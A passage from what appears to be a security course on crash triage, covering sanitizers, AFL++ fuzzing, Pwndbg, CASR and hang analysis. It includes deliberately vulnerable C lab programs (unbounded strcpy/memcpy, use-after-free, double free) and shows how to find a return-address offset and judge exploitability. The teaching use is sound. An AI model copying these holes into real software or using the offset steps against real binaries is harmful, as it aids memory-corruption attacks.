clang -fsanitize=address -g program.c -o program_asan
./program_asan < crash_input

# Option 2: If you can rebuild with Scudo, reproduce under its GWP-ASan integration
clang -fsanitize=scudo -g program.c -o program_scudo
SCUDO_OPTIONS=GWP_ASAN_SampleRate=1 ./program_scudo < crash_input

# Option 3: If you only have a production binary, run repeatedly until it gets sampled
for i in {1..1000}; do
    ./program < crash_input 2>&1 | grep -q "GWP-ASan" && break
done
```

**GWP-ASan vs ASAN for Crash Analysis**:

| Aspect              | GWP-ASan       | ASAN                |
| ------------------- | -------------- | ------------------- |
| **Overhead**        | ~0.1%          | ~200%               |
| **Memory**          | Minimal        | 2-3x                |
| **Detection rate**  | ~1% of bugs    | 100% of bugs        |
| **Use case**        | Production     | Development/fuzzing |
| **Reproducibility** | Low (sampling) | 100%                |
| **Deployment**      | Safe for prod  | Never in prod       |

**Workflow: GWP-ASan Crash → Full Analysis**:

```bash
# 1. Receive GWP-ASan crash from production telemetry
# 2. Extract crash details (allocation stack, free stack, access stack)

# 3. Create reproducer from crash input
echo "$crash_input" > repro.bin

# 4. Build with full ASAN for deterministic reproduction
clang -fsanitize=address -g program.c -o program_asan

# 5. Run ASAN build to get complete analysis
./program_asan < repro.bin
# Now get full ASAN report with 100% detection

# 6. If can't reproduce, the allocation pattern matters
# GWP-ASan only caught it because specific allocation was sampled
# May need to create targeted test case based on stacks
```

**Key Points for GWP-ASan Analysis**:

1. **Sampling means incomplete view**: The bug exists, but you only caught it by luck
2. **Allocation context is crucial**: The allocation stack tells you what was sampled
3. **Use full ASAN to reproduce**: Convert GWP-ASan report to ASAN-reproducible test
4. **Production-only bugs are real**: Some bugs only manifest under real workloads
5. **Check telemetry frequency**: Multiple GWP-ASan hits = higher severity bug

#### Practical Workflow

**Step 1: Initial Fuzzing** (ASAN + UBSAN):

```bash
# Compile with recommended combination
clang -fsanitize=address,undefined -g -O0 -fno-omit-frame-pointer -D_FORTIFY_SOURCE=0 target.c -o target_asan_ubsan

# Fuzz with AFL++
afl-fuzz -i seeds/ -o out/ -m none -- ./target_asan_ubsan @@
```

**Step 2: Periodic MSAN Check**:

```bash
# Compile with MSAN (requires instrumented libc++)
clang++-19 -fsanitize=memory -stdlib=libc++ -fPIE -pie -g -O0 -fno-omit-frame-pointer target.c -o target_msan

# Run corpus through MSAN build
for testcase in out/queue/*; do
    ./target_msan < $testcase
done
```

**Step 3: Multithreaded Target TSAN Check**:

```bash
# Compile with TSAN (use gcc or clang)
gcc -fsanitize=thread -g -O0 -fno-omit-frame-pointer target.c -o target_tsan -lpthread

# Run with diverse inputs
for testcase in out/queue/*; do
    ./target_tsan < $testcase
done
```

**Sanitizer Selection Guide**:

```text
┌─────────────────────────────────────────────────────────────────────┐
│ What are you testing?                                               │
└─────────────────────────────────────────────────────────────────────┘
         │
         ├─ Single-threaded parser/server
         │  └─> ASAN + UBSAN (default choice)
         │      clang -fsanitize=address,undefined ...
         │
         ├─ Multithreaded application
         │  └─> Separate runs: ASAN+UBSAN, then TSAN
         │      gcc -fsanitize=thread ... -lpthread
         │
         ├─ Kernel/crypto code with info leaks
         │  └─> MSAN (separate run, requires instrumented libc++)
         │      clang++ -fsanitize=memory -stdlib=libc++ ...
         │
         └─ Arithmetic-heavy code
            └─> UBSAN (minimal overhead, always enable)
                clang -fsanitize=undefined ...
```

### Example: Combining Sanitizers

**Scenario**: Fuzzing a multithreaded HTTP server

**Phase 1**: ASAN + UBSAN fuzzing (24 hours)

```bash
afl-fuzz -i seeds/ -o findings_asan/ -m none -- ./httpd_asan_ubsan @@
# Found: 3 heap overflows, 2 integer overflows
```

**Phase 2**: MSAN validation (4 hours)

```bash
# Run interesting inputs through MSAN
for crash in findings_asan/crashes/*; do
    ./httpd_msan < $crash
done
# Found: 1 uninitialized variable leading to info leak
```

**Phase 3**: TSAN validation (4 hours)

```bash
# Run corpus through TSAN
for input in findings_asan/queue/*; do
    ./httpd_tsan < $input
done
# Found: 2 data races in request handling
```

**Result**: 8 unique bugs across 3 bug classes

### Practical Exercise

**Task**: Identify and classify 10 ASAN-detected bugs

If you built and fuzzed real targets in Week 2 (for example, libWebP, GStreamer, or your own small parser/HTTP server), consider recompiling **one of those exact targets** with ASAN and running this workflow on the crashes you already found. The synthetic exercises below are fine to start with, but applying the same process to a familiar Week 2 target will make the connection between fuzzing and crash analysis very concrete.

**Provided Test Programs** (compile each with ASAN):

1. `heap_overflow.c` - Heap buffer overflow
2. `stack_overflow.c` - Stack buffer overflow
3. `uaf_read.c` - Use-after-free (read)
4. `uaf_write.c` - Use-after-free (write)
5. `double_free.c` - Double-free
6. `memory_leak.c` - Memory leak
7. `global_overflow.c` - Global buffer overflow
8. `stack_use_after_return.c` - Stack use-after-return
9. `initialization_order.c` - Initialization order bug
10. `alloc_dealloc_mismatch.c` - new/delete mismatch

**For Each Program**:

1. **Compile with ASAN**:

   ```bash
   clang -g -O1 -fsanitize=address -fno-omit-frame-pointer program.c -o program_asan
   ```

2. **Run and Capture Output**:

   ```bash
   ./program_asan 2>&1 | tee program_output.txt
   ```

3. **Analyze Report**:
   - What type of error was detected?
   - What line triggered it?
   - What was the allocation/free stack trace?
   - How many bytes were involved?

4. **Classify Exploitability**:
   - Read vs Write access?
   - Controlled by attacker input?
   - How many bytes overflow?
   - What mitigations apply?

5. **Document**:

```markdown
## Bug: heap_overflow.c

- **ASAN Type**: heap-buffer-overflow
- **Operation**: WRITE of size 18
- **Overflow**: 8 bytes past 10-byte allocation
- **Exploitability**: High - Write overflow with large controlled data
```

**Success Criteria**:

- All 10 programs analyzed
- ASAN error types correctly identified
- Stack traces interpreted
- Exploitability assessed
- Clear documentation of findings

### Key Takeaways

1. **ASAN is powerful**: Catches bugs at source, not just symptoms
2. **Detailed reports**: Allocation and free stacks make root cause obvious
3. **Multiple error types**: Different bugs have different ASAN signatures
4. **Essential for fuzzing**: Turns crashes into actionable vulnerability reports
5. **Combine with debugging**: ASAN finds bug, debugger analyzes exploit primitive

### Discussion Questions

1. Why does ASAN have lower false positive rate than traditional memory checkers like Valgrind?
2. How does the quarantine mechanism help catch use-after-free bugs?
3. When would you use MSAN vs ASAN vs TSAN for a multi-threaded program with suspected memory issues?
4. Why can't ASAN and MSAN be combined in the same build, and how do you work around this limitation?

## Day 3: Exploitability Assessment with Automated Tools

- **Goal**: Use automated tools to assess crash exploitability and prioritize vulnerabilities.
- **Activities**:
  - _Reading_:
    - [CASR - Crash Analysis and Severity Reporter](https://github.com/ispras/casr)
  - _Online Resources_:
    - [Crash Triage Best Practices](https://github.com/google/fuzzing/blob/master/docs/good-fuzz-target.md)
    - [AFL++ Crash Triage](https://aflplus.plus/docs/fuzzing_in_depth/#4-triaging-crashes)
  - _Tool Setup_:
    - CASR (Rust-based crash analyzer - primary tool)
    - AFL++ utilities (afl-tmin, afl-cmin)
  - _Exercise_:
    - Triage 20 AFL++ crashes
    - Bucket by exploitability and uniqueness

### Quick Triage Checklist

Before diving into detailed analysis, run through this checklist for every crash:

```text
# Crash Triage Checklist

## What crashed?

- Instruction: (e.g., mov [rax], rcx)
- Signal: (e.g., SIGSEGV, SIGABRT)

## What register/memory was accessed?

- Faulting address: (e.g., 0x4141414141414141)
- Access type: [ ] Read [ ] Write [ ] Execute

## Is that value attacker-controlled?

- Pattern visible: [ ] Yes [ ] No
- Input correlation: [ ] Direct [ ] Indirect [ ] Unknown

## What mitigations are active?

- Stack canary: [ ] Yes [ ] No
- NX/DEP: [ ] Yes [ ] No
- ASLR/PIE: [ ] Yes [ ] No
- RELRO: [ ] None [ ] Partial [ ] Full
- CFG/CFI: [ ] Yes [ ] No
- CET: [ ] Yes [ ] No

## Initial classification

- Type: [ ] Stack overflow [ ] Heap overflow [ ] UAF [ ] Format string [ ] Other
- Severity: [ ] EXPLOITABLE [ ] PROBABLY_EXPLOITABLE [ ] NOT_EXPLOITABLE
```

### Interactive Analysis and Mitigation Checks

#### Checking Binary Mitigations First

**Always check mitigations before deep analysis** - they determine exploitability:

**Using checksec (pwntools)**:

```bash
# Install if needed
cd crash_analysis_lab/
source .venv/bin/activate
# pip install pwntools

checksec --file=./vuln_no_protect
#[*] '/home/dev/crash_analysis_lab/vuln_no_protect'
#    Arch:       amd64-64-little
#    RELRO:      Partial RELRO
#    Stack:      No canary found
#    NX:         NX unknown - GNU_STACK missing
#    PIE:        No PIE (0x400000)
#    Stack:      Executable
#    RWX:        Has RWX segments
#    SHSTK:      Enabled
#    IBT:        Enabled
#    Stripped:   No
#    Debuginfo:  Yes

checksec --file=./vuln_asan
# [*] '/home/dev/crash_analysis_lab/vuln_asan'
#    Arch:       amd64-64-little
#    RELRO:      Full RELRO
#    Stack:      Canary found
#    NX:         NX enabled
#    PIE:        PIE enabled
#    FORTIFY:    Enabled
#    ASAN:       Enabled
#    SHSTK:      Enabled
#    IBT:        Enabled
#    Stripped:   No
#    Debuginfo:  Yes

```

**Checking for CET (Control-flow Enforcement Technology)**:

```bash
# Check if binary has CET enabled
readelf -n ./vuln_protected
# Properties: x86 feature: IBT, SHSTK
# GNU_PROPERTY_X86_FEATURE_1_SHSTK (Shadow Stack)
# GNU_PROPERTY_X86_FEATURE_1_IBT (Indirect Branch Tracking)
```

**Checking System-Wide Protections**:

```bash
# ASLR status
cat /proc/sys/kernel/randomize_va_space
# 0 = disabled, 1 = conservative, 2 = full

# Kernel protection features
cat /sys/devices/system/cpu/vulnerabilities/*
```

### Enhanced GDB with Pwndbg

- Modern crash analysis on Linux uses enhanced GDB plugins that provide significantly better crash context than vanilla GDB.
- **Pwndbg** is the current standard for exploit development and crash analysis, replacing older tools like the now-unmaintained GDB exploitable plugin.

**What Pwndbg Provides**:

- Automatic context display on every stop (registers, stack, code, backtrace)
- Heap visualization and analysis (`heap`, `bins`, `arena`)
- Memory search and pattern finding (`search`, `telescope`)
- Exploit development helpers (`cyclic`, `rop`, `checksec`)
- Enhanced memory display with smart dereferencing

**Crash Analysis with Pwndbg**:

```bash
# Navigate to lab directory and load crashing program (using Day 1 binaries)
cd ~/crash_analysis_lab
gdb ./vuln_no_protect

# Run with crashing input (test case 1 = stack overflow)
pwndbg> run 1 $(python3 -c "print('A'*200)")
# Pwndbg automatically shows context on crash:
#LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
#──────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────────────────────────────────────────────────────────────
# RAX  0xd5
# RBX  0x7fffffffe128 —▸ 0x7fffffffe3db ◂— '/home/dev/crash_analysis_lab/vuln_no_protect'
# RCX  0
# RDX  0
# RDI  0x7fffffffdda0 —▸ 0x7fffffffddd0 ◂— 0x4141414141414141 ('AAAAAAAA')
# RSI  0x4052a0 ◂— 0x66667542205d2a5b ('[*] Buff')
# R8   0x73
# R9   0
# R10  0xffffffff
# R11  0x202
# R12  3
# R13  0
# R14  0x403e00 (__do_global_dtors_aux_fini_array_entry) —▸ 0x4011a0 (__do_global_dtors_aux) ◂— endbr64
# R15  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe2e0 ◂— 0
# RBP  0x4141414141414141 ('AAAAAAAA')
# RSP  0x7fffffffdfd8 ◂— 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
# RIP  0x401225 (stack_overflow+79) ◂— ret
#───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
# ► 0x401225 <stack_overflow+79>    ret                                <0x4141414141414141>
#    ↓
#─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ SOURCE (CODE) ]─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
#In file: /home/dev/crash_analysis_lab/src/vulnerable_suite.c:11
#    6 void stack_overflow(char *input) {
#    7     char buffer[64];
#    8     printf("[*] Copying input to 64-byte buffer...\n");
#    9     strcpy(buffer, input);  // No bounds check!
#   10     printf("[*] Buffer: %s\n", buffer);
# ► 11 }
```

**Key Pwndbg Commands for Crash Analysis**:

```bash
# Memory examination
pwndbg> telescope $rsp 20        # Smart stack display (shows 20 qwords with dereferencing)
pwndbg> hexdump $rdi 64          # Hex dump memory (use register containing valid pointer)
pwndbg> vmmap                     # Memory map with permissions (STACK/HEAP/CODE highlighting)

# Heap analysis (critical for heap bugs)
pwndbg> heap                      # Heap overview (shows allocated chunks with addr/size)
pwndbg> bins                      # Show all bin states (tcache, fastbins, unsorted, small, large)
pwndbg> arena                     # Display main arena (top chunk, bins, fastbinsY)

# Search for input patterns (finds pattern across all memory regions)
pwndbg> search "AAAA"            # Find pattern in memory (shows [heap], [stack], libc, etc.)
pwndbg> search -t qword 0x4141414141414141  # Search for specific qword value

# Security checks
pwndbg> checksec                  # Show binary mitigations

# Exploit helpers - finding offset to control RIP
pwndbg> run 1 $(cyclic 200)       # Run with de Bruijn pattern
# After crash, RSP points to pattern (e.g., "saaataaa...")
pwndbg> x/s $rsp                  # View pattern string at RSP
pwndbg> cyclic -l saaa -n 4       # Find offset using first 4 chars → offset 72

# Context control
pwndbg> context                   # Redisplay context
pwndbg> context reg stack code   # Custom context
```

**Automated Batch Analysis with Pwndbg**:

```bash
#!/bin/bash
# analyze_crashes.sh
# Run from ~/crash_analysis_lab directory

cd ~/crash_analysis_lab

for crash in crashes/*; do
    echo "=== Analyzing $(basename $crash) ==="
    gdb -batch \
        -ex "run < $crash" \
        -ex "bt" \
        -ex "info registers" \
        -ex "checksec" \
        -ex "quit" \
        ./vuln_no_protect 2>&1 | tee analysis_$(basename $crash).txt
done
```

**Exploitability Assessment with Pwndbg**:

```bash
# At crash, assess exploitability (using vuln_no_protect from Day 1):
cd ~/crash_analysis_lab
gdb ./vuln_no_protect
pwndbg> run 1 $(python3 -c "print('A'*200)")
# ... crash occurs ...

pwndbg> checksec
# File:     /home/dev/crash_analysis_lab/vuln_no_protect
# Arch:     amd64
# RELRO:      Partial RELRO
# Stack:      No canary found
# NX:         NX unknown - GNU_STACK missing
# PIE:        No PIE (0x400000)
# Stack:      Executable
# RWX:        Has RWX segments
# SHSTK:      Enabled
# IBT:        Enabled
# Stripped:   No
# Debuginfo:  Yes
#
# Key indicators for exploitation:
# - "Stack: Executable" + "Has RWX segments" = shellcode can run on stack
# - "No canary found" = no stack smashing protection
# - "No PIE" = fixed addresses, no ASLR for binary

# Check if RIP/RAX controlled
pwndbg> p/x $rip
# $1 = 0x401225
# RIP points to valid code (ret instruction), not yet hijacked

# Check what instruction we're at
pwndbg> x/i $rip
# => 0x401225 <stack_overflow+79>:  ret
# About to return - the ret will pop 0x4141414141414141 into RIP

# Examine the backtrace - this reveals the overflow
pwndbg> bt full
# #0  0x0000000000401225 in stack_overflow (input=0x7fffffffe40a 'A' <repeats 200 times>) at vulnerable_suite.c:11
#         buffer = 'A' <repeats 64 times>
# #1  0x4141414141414141 in ?? ()    <-- EXPLOITABLE! Return address overwritten
# #2  0x4141414141414141 in ?? ()    <-- Stack completely corrupted with our input
# ... (more 0x41's)
#
# Key indicators:
# - Return addresses show 0x4141414141414141 = "AAAAAAAA" (our input)
# - This means we control where execution goes after ret
# - VERDICT: EXPLOITABLE - classic stack buffer overflow with RIP control
```

### CASR - Modern Crash Analyzer

**What Is CASR?**:

CASR (Crash Analysis and Severity Reporter) is a modern, Rust-based crash analysis framework developed by ISP RAS.

**Key Features (v2.13+ / Latest: v2.14)**:

- **Multi-language support**: C/C++, Rust, Go, Python, Java, JavaScript, C#
- **Multiple analysis backends**: ASAN, UBSAN, TSAN, MSAN, GDB, core dumps
- **Fuzzer integration**: AFL++, libFuzzer, Atheris (Python), honggfuzz
- **CI/CD ready**: SARIF reports, DefectDojo integration, GitHub Actions support
- **23+ severity classes**: Precise exploitability assessment with modern patterns
- **Clustering**: Automatic deduplication using stack trace similarity
- **TUI interface**: Interactive crash browsing with filtering
- **LibAFL integration**: Native support for Rust-based fuzzing (v2.14+)

**Installation**:

```bash
# Install via cargo
cargo install casr

# Or from source for latest features
git clone https://github.com/ispras/casr
cd casr
cargo build --release
sudo cp target/release/casr-* /usr/local/bin/

# Verify installation
casr-san --version
casr-gdb --version
casr-cluster --version
```

> [!IMPORTANT]
> **CASR severity is heuristic-based**: CASR is a triage assistant, not an oracle. Its classifications (EXPLOITABLE, PROBABLY_EXPLOITABLE, NOT_EXPLOITABLE) are based on crash patterns and may not reflect actual exploitability. Always perform manual analysis on high-priority crashes. For example:
>
> - A "NOT_EXPLOITABLE" null deref might become exploitable with heap manipulation
> - An "EXPLOITABLE" crash might be blocked by mitigations CASR doesn't detect
> - Use CASR for prioritization, not final verdicts

#### CASR Tool Suite

**casr-san**: Analyze sanitizer output (ASAN/UBSAN/MSAN/TSAN)

```bash
# Navigate to lab directory (created in Day 1)
cd ~/crash_analysis_lab

# Create output directory for CASR reports
mkdir -p casrep

# Compile with ASAN (if not already done in Day 1)
clang -g -O1 -fsanitize=address -fno-omit-frame-pointer src/vulnerable_suite.c -o vuln_asan

# Analyze crash (test case 3 = UAF)
casr-san -o casrep/uaf.casrep -- ./vuln_asan 3

# Analyze stack overflow (test case 1 - needs ~100+ chars to overflow 64-byte buffer)
casr-san -o casrep/stack_overflow.casrep -- ./vuln_asan 1 $(python3 -c "print('A'*200)")

# Analyze heap overflow (test case 2)
casr-san -o casrep/heap_overflow.casrep -- ./vuln_asan 2 $(python3 -c "print('A'*100)")

# Analyze double free (test case 4)
casr-san -o casrep/double_free.casrep -- ./vuln_asan 4

# Analyze NULL dereference (test case 5 with trigger=0)
casr-san -o casrep/null_deref.casrep -- ./vuln_asan 5 0
```

**casr-gdb**: Analyze crashes via GDB (no sanitizer needed)

```bash
# Analyze crash using GDB (using vuln_no_protect from Day 1)
cd ~/crash_analysis_lab

# Stack overflow (test case 1) - crashes due to return address overwrite
casr-gdb -o casrep/stack_overflow_gdb.casrep -- ./vuln_no_protect 1 $(python3 -c "print('A'*200)")

# Double free (test case 4) - crashes due to glibc allocator detection
casr-gdb -o casrep/double_free_gdb.casrep -- ./vuln_no_protect 4

# NULL dereference (test case 5) - crashes on NULL pointer access
casr-gdb -o casrep/null_deref_gdb.casrep -- ./vuln_no_protect 5 0

# NOTE: Heap overflow (test 2) and UAF (test 3) typically don't crash without
# sanitizers - they corrupt memory silently. Use ASAN builds (casr-san) to detect these.

# For file-input binaries (not vulnerable_suite.c), use @@ placeholder:
# casr-gdb -o casrep/crash.casrep -- ./file_based_target @@

# With custom GDB path
casr-gdb --gdb-path /usr/local/bin/gdb -o casrep/crash.casrep -- ./vuln_no_protect 1 $(python3 -c "print('A'*200)")
```

**casr-core**: Analyze core dumps

```bash
# Navigate to lab directory (created in Day 1)
cd ~/crash_analysis_lab
mkdir -p casrep cores

# Enable core dumps
ulimit -c unlimited

# Generate crashes for different test cases
./vuln_no_protect 1 $(python3 -c "print('A'*200)")  # Stack overflow
./vuln_no_protect 3                                  # Use-after-free
./vuln_no_protect 4                                  # Double free
./vuln_no_protect 5 0                                # NULL dereference

# Analyze core dump
# On systemd systems, extract core first using coredumpctl(you might to look at cwd or /var/crash as well):
coredumpctl dump -o cores/vuln_no_protect.core
casr-core -o casrep/crash.casrep -e ./vuln_no_protect -c cores/vuln_no_protect.core

# Alternative: If core_pattern writes to CWD (core.%e.%p):
# casr-core -o casrep/crash.casrep -e ./vuln_no_protect -c core.vuln_no_protect.*

# Batch analyze multiple cores (after extracting with coredumpctl)
for core in cores/*; do
    casr-core -o casrep/$(basename $core).casrep -e ./vuln_no_protect -c $core
done
```

**casr-cluster**: Deduplicate and cluster crashes

```bash
# Cluster all reports from casrep/ directory by call stack and crash type
casr-cluster -c casrep/ clustered/

# Leave only reports with unique crash lines in each cluster
casr-cluster -c casrep/ clustered/ --unique-crashline

# Deduplicate reports (remove duplicates, keep unique)
casr-cluster -d casrep/ deduped/

# Merge new reports into existing cluster directory
#casr-cluster -m new_crashes/ clustered/

# Update existing clusters with new reports
#casr-cluster -u new_crashes/ clustered/

# Calculate clustering quality (silhouette score)
casr-cluster -e clustered/

# Compare two crash sets (find new unique crashes)
#casr-cluster --diff new_crashes/ old_crashes/ diff_output/

# Parallel processing
#casr-cluster -c casrep/ clustered/ -j 8
```

**casr-cli**: TUI for browsing crash reports

```bash
# Launch interactive tree browser (default)
casr-cli casrep/

# View mode options: tree, slider, stdout
casr-cli -v tree casrep/
casr-cli -v slider casrep/
casr-cli -v stdout casrep/

# Print only unique crash lines in statistics
casr-cli -u casrep/

# Generate SARIF report from CASR reports
casr-cli --sarif output.sarif casrep/

# SARIF with source root for proper file paths
casr-cli --sarif output.sarif --source-root /home/dev/crash_analysis_lab casrep/

# Strip path prefix from crash paths in statistics
casr-cli --strip-path /home/dev/crash_analysis_lab/ casrep/
```

**AFL++ Fuzzing to CASR Triage**

```bash
cd ~/crash_analysis_lab/

# 1. Create a simple vulnerable target (heap overflow)
cat > src/fuzz_target.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

volatile char sink;  // Prevent optimization

void process_input(char *data, size_t len) {
    char buffer[64];

    // Vulnerability 1: Stack buffer overflow
    if (len > 0 && data[0] == 'A') {
        memcpy(buffer, data, len);  // No bounds check
        sink = buffer[0];           // Force use
    }

    // Vulnerability 2: Heap overflow
    if (len > 1 && data[0] == 'B') {
        char *heap = malloc(32);
        memcpy(heap, data, len);    // Overflow if len > 32
        sink = heap[0];             // Force use before free
        free(heap);
    }

    // Vulnerability 3: Use-after-free
    if (len > 1 && data[0] == 'C') {
        char *ptr = malloc(16);
        free(ptr);
        sink = ptr[0];              // UAF read (more reliable than write)
    }

    // Vulnerability 4: Double free
    if (len > 1 && data[0] == 'D') {
        char *ptr = malloc(16);
        free(ptr);
        free(ptr);                  // Double free
    }
}

int main(int argc, char **argv) {
    if (argc < 2) return 1;

    FILE *f = fopen(argv[1], "rb");
    if (!f) return 1;

    fseek(f, 0, SEEK_END);
    size_t len = ftell(f);
    fseek(f, 0, SEEK_SET);

    char *data = malloc(len + 1);
    fread(data, 1, len, f);
    fclose(f);

    process_input(data, len);

    free(data);
    return 0;
}
EOF

# 2. Build with AFL++ instrumentation and ASan
mkdir -p bin
export CC=afl-clang-fast
export AFL_USE_ASAN=1
$CC -g -O0 -fno-omit-frame-pointer src/fuzz_target.c -o bin/fuzz_target_asan

# Build without sanitizer for GDB analysis comparison
$CC -g src/fuzz_target.c -o bin/fuzz_target_plain

# 3. Create seed corpus (seeds that will trigger crashes)
mkdir -p afl_input
python3 -c "import sys; sys.stdout.buffer.write(b'A' + b'X'*100)" > afl_input/seed_stack
python3 -c "import sys; sys.stdout.buffer.write(b'B' + b'X'*50)" > afl_input/seed_heap
python3 -c "import sys; sys.stdout.buffer.write(b'CX')" > afl_input/seed_uaf
python3 -c "import sys; sys.stdout.buffer.write(b'DX')" > afl_input/seed_double
echo -n "test" > afl_input/seed_normal

# 4. Run AFL++ fuzzing (run for a few minutes to generate crashes)
# Use tmux or screen for longer sessions
timeout 300 afl-fuzz -i afl_input -o afl_output -m none -- ./bin/fuzz_target_asan @@

# Check crashes found
ls -la afl_output/default/crashes/

# 5. Triage crashes with casr-afl
casr-afl -i afl_output/default -o afl_casrep -t 10 -j 4 -f -- ./bin/fuzz_target_asan @@

# 6. View clustered results
ls afl_casrep/
# cl1/ cl2/ cl3/ ... (each cluster = unique crash type)

# 7. Generate statistics (just pass the directory)
casr-cli afl_casrep/

# 8. Optional: Add GDB analysis for non-sanitizer crashes
casr-afl -i afl_output/default -o afl_casrep_gdb -f -- ./bin/fuzz_target_plain @@
```

### Timeouts and Hangs Are Bugs Too

#### Why Timeouts Matter

- **Denial of Service**: A single malicious input causing 100% CPU for hours
- **Algorithmic Complexity**: O(n²) or O(n!) behavior with crafted input
- **Deadlocks**: Multithreaded code stuck waiting forever
- **Resource Exhaustion**: Memory growth without bounds

#### Creating a Hang-Prone Test Program

First, let's create a program that can hang to practice these techniques:

```c
// ~/crash_analysis_lab/src/hang_test.c
// ~/crash_analysis_lab/src/hang_test.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

// Simulates algorithmic complexity attack
void slow_parse(char *input, int len) {
    // O(n²) behavior - gets very slow with large input
    for (int i = 0; i < len; i++) {
        for (int j = 0; j < len; j++) {
            if (input[i] == input[j]) {
                usleep(100);  // Simulate work
            }
        }
    }
}

// Multiple infinite loop patterns based on input
void process_command(char *cmd) {
    if (strncmp(cmd, "LOOPA", 5) == 0) {
        printf("[*] Entering loop pattern A...\n");
        while(1) { }  // Pattern A
    }
    if (strncmp(cmd, "LOOPB", 5) == 0) {
        printf("[*] Entering loop pattern B...\n");
        for(;;) { }   // Pattern B - different stack location
    }
    if (strncmp(cmd, "LOOPC", 5) == 0) {
        printf("[*] Entering loop pattern C...\n");
        volatile int spin = 1;
        while(spin) { }  // Pattern C
    }
    if (strncmp(cmd, "LOOP", 4) == 0) {
        printf("[*] Entering default loop...\n");
        while(1) { }  // Default pattern
    }
    printf("[*] Command processed: %s\n", cmd);
}

// Recursive function that can stack overflow or hang
void recursive_parse(char *data, int depth) {
    if (depth > 10000) return;  // Safety limit
    if (data[0] == 'R') {
        recursive_parse(data, depth + 1);
    }
}

int main(int argc, char **argv) {
    char buffer[1024];

    if (argc < 2) {
        printf("Usage: %s <1|2|3> [input]\n", argv[0]);
        printf("  1 <input>  - Slow O(n²) parsing\n");
        printf("  2          - Infinite loop (reads from stdin)\n");
        printf("               LOOPA/LOOPB/LOOPC for different patterns\n");
        printf("  3 <input>  - Deep recursion\n");
        return 1;
    }

    int test = atoi(argv[1]);

    switch(test) {
        case 1:
            if (argc < 3) return 1;
            slow_parse(argv[2], strlen(argv[2]));
            break;
        case 2:
            if (fgets(buffer, sizeof(buffer), stdin)) {
                process_command(buffer);
            }
            break;
        case 3:
            if (argc < 3) return 1;
            recursive_parse(argv[2], 0);
            break;
    }

    printf("[*] Done\n");
    return 0;
}
```

**Build the hang test program**:

```bash
cd ~/crash_analysis_lab

# Build without optimizations for clear stack traces
gcc -g -O0 src/hang_test.c -o hang_test

# Build with ASAN for timeout analysis
gcc -g -O0 -fsanitize=address -fno-omit-frame-pointer src/hang_test.c -o hang_test_asan
```

#### Collecting Stack Dumps from Hangs

```bash
cd ~/crash_analysis_lab

# Create a hang input
echo "LOOP" > crashes/hang_input.txt

# Run with timeout - program hangs and gets killed
timeout --signal=SIGABRT 10s ./hang_test 2 < crashes/hang_input.txt
# Output: "[*] Entering infinite loop..." then "timeout: the monitored command dumped core"

# The GDB batch approach doesn't work well for hangs because timeout kills
# the entire GDB process. Instead, use the attach method:

# Start the hang in background:
./hang_test 2 < crashes/hang_input.txt &
HANG_PID=$!

# Wait a moment for it to enter the loop
sleep 1

# Attach GDB and get backtrace:
sudo gdb -batch -p $HANG_PID \
    -ex "bt" \
    -ex "info registers" \
    -ex "x/5i \$pc" \
    -ex "detach" 2>&1 | tee crashes/hang_analysis.txt

# Example output:
#process_command (cmd=0x7fff499d9fd0 "LOOP\n") at src/hang_test.c:36
#36              while(1) { }  // Default pattern
#0  process_command (cmd=0x7fff499d9fd0 "LOOP\n") at src/hang_test.c:36
#1  0x000064fc7f622532 in main (argc=2, argv=0x7fff499da508) at src/hang_test.c:70
# ...
#=> 0x64fc7f622375 <process_command+221>:        nop
#   0x64fc7f622376 <process_command+222>:        jmp    0x64fc7f622375 <process_command+221>
#
# The jmp-to-itself pattern confirms an infinite loop!

# Clean up the hung process
kill $HANG_PID 2>/dev/null
```

#### CASR Classification for Hangs

CASR is designed for crash analysis, not hang detection. It requires the program to actually crash (receive a signal like SIGSEGV or SIGABRT from within the program):

```bash
cd ~/crash_analysis_lab
mkdir -p casrep

# This does NOT work - timeout kills the process externally, CASR sees "no crash"
casr-san -o casrep/hang.casrep -- timeout 10s ./hang_test_asan 2 < crashes/hang_input.txt
# Error: Program terminated (no crash)

# For hangs, use the GDB attach method instead (shown above)
# CASR is best suited for actual crashes, not timeouts
```

**Key insight**: Hangs and timeouts are different from crashes:

- **Crash**: Program receives a signal (SIGSEGV, SIGABRT) due to internal error
- **Hang**: Program runs forever, must be killed externally
- **CASR**: Only analyzes crashes, not externally-killed processes

For hang analysis, use the GDB attach method shown in Method 1 above.

**When to use CASR**: Use it for actual crashes from the Day 1-2 test binaries:

```bash
cd ~/crash_analysis_lab

# CASR works great for actual crashes
casr-san -o casrep/stack_overflow.casrep -- ./vuln_asan 1 $(python3 -c "print('A'*200)")
cat casrep/stack_overflow.casrep | jq '.CrashSeverity'
# Output: { "Type": "EXPLOITABLE", "ShortDescription": "stack-buffer-overflow", ... }
```

#### Simple Hang Bucketing

When you have many timeouts from fuzzing, bucket by stack signature:

```bash
#!/bin/bash
# ~/crash_analysis_lab/bucket_hangs.sh

cd ~/crash_analysis_lab
mkdir -p hang_buckets

for hang in crashes/hang_*.txt; do
    [ -f "$hang" ] || continue

    # Start the program in background
    ./hang_test 2 < "$hang" &
    pid=$!

    sleep 0.3

    # Get stack, strip addresses, keep only function names and line info
    sig=$(sudo gdb -batch -p $pid -ex "bt 5" 2>&1 | \
          grep "^#" | \
          sed 's/0x[0-9a-f]*//g' | \
          sed 's/cmd=[^ ]*/cmd=/g' | \
          md5sum | cut -d' ' -f1)

    kill -9 $pid 2>/dev/null
    wait $pid 2>/dev/null

    mkdir -p hang_buckets/$sig
    cp "$hang" hang_buckets/$sig/
done

echo "Unique hang patterns:"
ls -1 hang_buckets/ | wc -l
```

**Test the bucketing script**:

```bash
